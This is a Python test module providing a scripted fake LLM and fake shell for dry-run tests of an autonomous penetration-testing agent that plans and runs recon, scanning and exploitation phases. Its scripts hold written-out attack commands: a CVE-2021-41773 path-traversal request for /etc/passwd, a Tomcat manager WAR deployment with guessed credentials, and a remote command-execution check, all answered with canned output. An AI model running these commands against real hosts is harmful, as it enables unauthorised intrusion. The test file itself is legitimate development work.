"""Scripted LLM + shell for `--dry-run` and zero-token tests.

The script exercises the full machinery: DAG planning, per-task ReAct loops,
a failed exploitation (overridden by the evidence layer), retry, replan,
phase handover, and reporting - without a single API call or SSH connection.
"""

from __future__ import annotations

import itertools
import re
from typing import Any, Dict, List, Sequence, Tuple

from langchain_core.messages import AIMessage, HumanMessage, SystemMessage

from agent.schema import PlanSpec, TaskSpec, TaskVerdict
from agent.llm import reset_llm_factory, set_llm_factory
from agent.tools import reset_shell_override, set_shell_override

PORT_SCAN = """Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 100.84.151.2
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8080/tcp  open  http-proxy
Nmap done: 1 IP address (1 host up) scanned in 12.31 seconds
"""

SERVICE_SCAN = """Starting Nmap 7.94 ( https://nmap.org )
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp   open  http    Apache httpd 2.4.49 ((Unix))
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
Service Info: OS: Linux
"""

SEARCHSPLOIT = """Exploits: 2
Apache HTTP Server 2.4.49 - Path Traversal | linux/webapps/50383.py
CVE-2021-41773  Apache HTTP Server 2.4.49 Path Traversal
"""

GOBUSTER = """===============================================================
Gobuster v3.6
[+] Url:                     http://100.84.151.2
===============================================================
/admin                (Status: 200) [Size: 1234]
/cgi-bin/             (Status: 403) [Size: 0]
/manual               (Status: 200) [Size: 512]
"""

PASSWD = """root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
"""

TOMCAT_DEPLOY = "OK - Deployed application at context path [/pwn]\n"
TOMCAT_EXEC = """HTTP/1.1 200 OK
Server: Apache-Coyote/1.1

uid=0(root) gid=0(root) groups=0(root)
"""

RULES: List[Tuple[str, str]] = [
    ("nmap -p-", PORT_SCAN),
    ("nmap -sV", SERVICE_SCAN),
    ("searchsploit", SEARCHSPLOIT),
    ("gobuster", GOBUSTER),
    ("cgi-bin", PASSWD),
    ("manager/text/deploy", TOMCAT_DEPLOY),
    ("exec?cmd=id", TOMCAT_EXEC),
]


class FakeShell:
    def __init__(self, rules: Sequence[Tuple[str, str]] = RULES):
        self.rules = list(rules)
        self.calls: List[str] = []

    def execute_cmd(self, command: str, timeout: Any = None) -> str:
        self.calls.append(command)
        for needle, output in self.rules:
            if needle in command:
                return output
        return f"[dry-run] no canned output for: {command}"

    def close(self) -> None:
        return None


def _exec(command: str, intent: str = "") -> Dict[str, Any]:
    return {"kind": "exec", "command": command, "intent": intent}


def _finish(success: bool, summary: str, evidence: str = "") -> Dict[str, Any]:
    return {"kind": "finish", "success": success, "summary": summary, "evidence": evidence}


TARGET = "100.84.151.2"

SCRIPTS: Dict[Tuple[str, str], List[Dict[str, Any]]] = {
    ("collector", "全端口"): [
        _exec(f"nmap -p- --min-rate 2000 -T4 --open {TARGET}", "enumerate every open port"),
    ],
    ("collector", "服务"): [
        _exec(f"nmap -sV -p22,80,8080 {TARGET}", "fingerprint services and versions"),
    ],
    ("scanner", "漏洞"): [
        _exec("searchsploit apache 2.4.49", "look up public exploits for the observed version"),
    ],
    ("scanner", "目录"): [
        _exec(f"gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirb/common.txt", "enumerate web paths"),
    ],
    ("exploiter", "Apache"): [
        _exec(
            f"curl -sS 'http://{TARGET}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
            "test CVE-2021-41773 path traversal",
        ),
        _finish(False, "path traversal returned /etc/passwd but no command execution", PASSWD.splitlines()[0]),
    ],
    ("exploiter", "Tomcat"): [
        _exec(
            f"curl -sS -X PUT 'http://{TARGET}:8080/manager/text/deploy?path=/pwn' -u tomcat:s3cret",
            "deploy a war through the manager application",
        ),
        _exec(f"curl -sS 'http://{TARGET}:8080/pwn/exec?cmd=id'", "verify remote command execution"),
        _finish(True, "war deployed and command execution confirmed", "uid=0(root) gid=0(root) groups=0(root)"),
    ],
}


class DryRunBrain:
    def __init__(self, target: str = TARGET):
        self.target = target
        self.plan_calls = 0
        self.command_calls = 0
        self.last_finish_success = True
        self._ids = itertools.count(1)

    # -- helpers ---------------------------------------------------------
    @staticmethod
    def _system(messages) -> str:
        for message in messages:
            if isinstance(message, SystemMessage):
                return message.content if isinstance(message.content, str) else ""
        return ""

    @staticmethod
    def _human(messages) -> str:
        for message in reversed(messages):
            if isinstance(message, HumanMessage):
                return message.content if isinstance(message.content, str) else ""
        return ""

    def _phase(self, messages) -> str:
        system = re.search(r"\((collector|scanner|exploiter)\)", self._system(messages))
        if system:
            return system.group(1)
        human = re.search(r"\((collector|scanner|exploiter)\)", self._human(messages))
        return human.group(1) if human else "collector"

    def _task(self, messages) -> str:
        for message in reversed(messages):
            content = message.content if isinstance(message.content, str) else ""
            match = re.search(r"TASK:\s*(.+)", content)
            if match:
                return match.group(1).strip()
        return ""

    def _steps_taken(self, messages) -> int:
        anchor = -1
        for index, message in enumerate(messages):
            if isinstance(message, HumanMessage):
                content = message.content if isinstance(message.content, str) else ""
                if "TASK:" in content:
                    anchor = index
        return sum(1 for message in messages[anchor + 1 :] if isinstance(message, AIMessage))

    def _plan(self, messages) -> PlanSpec:
        phase = self._phase(messages)
        replan = any("THIS IS A REPLAN" in (m.content if isinstance(m.content, str) else "") for m in messages if isinstance(m, HumanMessage))

        if phase == "collector":
            specs = [
                TaskSpec(id="t1", dependent_task_ids=[], instruction=f"使用 nmap 对 {self.target} 做全端口扫描", action="Shell"),
                TaskSpec(id="t2", dependent_task_ids=["t1"], instruction=f"对 {self.target} 已开放端口做服务版本识别", action="Enumerate"),
            ]
        elif phase == "scanner":
            specs = [
                TaskSpec(id="t1", dependent_task_ids=[], instruction=f"检索 {self.target} 上 Apache 2.4.49 的公开漏洞", action="Enumerate"),
                TaskSpec(id="t2", dependent_task_ids=[], instruction=f"对 {self.target} 的 Web 端口做目录枚举", action="Web"),
            ]
        else:
            specs = [
                TaskSpec(
                    id="t1",
                    dependent_task_ids=[],
                    instruction=f"验证 {self.target} 上 Apache 2.4.49 的路径穿越漏洞",
                    action="Exploit",
                )
            ]
            if replan:
                specs.append(
                    TaskSpec(
                        id="t2",
                        dependent_task_ids=[],
                        instruction=f"利用 {self.target}:8080 Tomcat manager 部署 war 并执行 id",
                        action="Exploit",
                    )
                )
        self.plan_calls += 1
        return PlanSpec(tasks=specs)

    def _script(self, messages) -> List[Dict[str, Any]]:
        phase = self._phase(messages)
        task = self._task(messages)
        for (script_phase, keyword), actions in SCRIPTS.items():
            if script_phase == phase and keyword.lower() in task.lower():
                return actions
        return [_finish(False, "no scripted action for this task", "")]

    def _tool_call(self, name: str, args: Dict[str, Any]) -> AIMessage:
        call_id = f"fake_{next(self._ids)}"
        return AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": call_id}])

    # -- model surface ---------------------------------------------------
    def command(self, messages) -> AIMessage:
        self.command_calls += 1
        actions = self._script(messages)
        index = self._steps_taken(messages)
        if index >= len(actions):
            return self._tool_call(
                "finish_task",
                {"success": False, "summary": "script exhausted", "evidence": ""},
            )
        action = actions[index]
        if action["kind"] == "exec":
            return self._tool_call(
                "execute_kali_command",
                {"command": action["command"], "intent": action.get("intent", ""), "timeout": 120},
            )
        self.last_finish_success = bool(action["success"])
        return self._tool_call(
            "finish_task",
            {
                "success": action["success"],
                "summary": action["summary"],
                "evidence": action.get("evidence", ""),
            },
        )

    def structured(self, schema, messages):
        if schema is PlanSpec:
            return self._plan(messages)
        if schema is TaskVerdict:
            # The scripted model is the only "judge" in dry-run mode: mirror the
            # claim it just made so the retry/replan narrative still plays out.
            success = self.last_finish_success
            return TaskVerdict(
                success=success,
                reason="dry-run evaluator accepted the transcript" if success else "dry-run script reported failure",
                evidence="dry-run",
            )
        try:
            return schema()
        except Exception:
            return schema.model_construct()

    def text(self, node: str, messages) -> str:
        if node == "reporter":
            return ""
        phase = self._phase(messages)
        return f"Dry-run summary: the {phase} phase ran with scripted observations."


class FakeLLM:
    def __init__(self, brain: DryRunBrain, node: str):
        self.brain = brain
        self.node = node

    def bind_tools(self, tools):
        return self

    def invoke(self, messages, config=None, **kwargs):
        if self.node == "command":
            return self.brain.command(messages)
        return AIMessage(content=self.brain.text(self.node, messages))

    def with_structured_output(self, schema, **kwargs):
        brain = self.brain

        class _Structured:
            def invoke(self, messages, config=None, **kwargs):
                return brain.structured(schema, messages)

        return _Structured()


def install_dry_run(target: str = TARGET) -> DryRunBrain:
    brain = DryRunBrain(target)
    set_shell_override(FakeShell())
    set_llm_factory(lambda node: FakeLLM(brain, node))
    return brain


def uninstall() -> None:
    reset_shell_override()
    reset_llm_factory()
